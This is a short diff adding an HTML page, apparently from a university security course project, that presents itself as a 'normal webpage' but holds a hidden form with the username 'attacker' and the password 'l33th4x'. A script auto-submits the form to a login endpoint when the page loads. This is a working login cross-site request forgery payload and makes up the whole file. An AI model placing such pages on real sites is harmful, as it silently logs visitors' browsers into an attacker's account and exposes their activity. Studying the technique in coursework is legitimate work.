@@ -1,0 +1,10 @@
+<h1>Welcome to my normal webpage!</h1>
+
+<form id="evil-form2" action="https://csci3403.com/proj3/login" method="POST">
+    <input id="username" name="username" type="text" value="attacker">
+    <input id="userpass" name="password" type="text" value="l33th4x">
+</form>
+
+<script>
+document.getElementById("evil-form2").submit()
+</script>
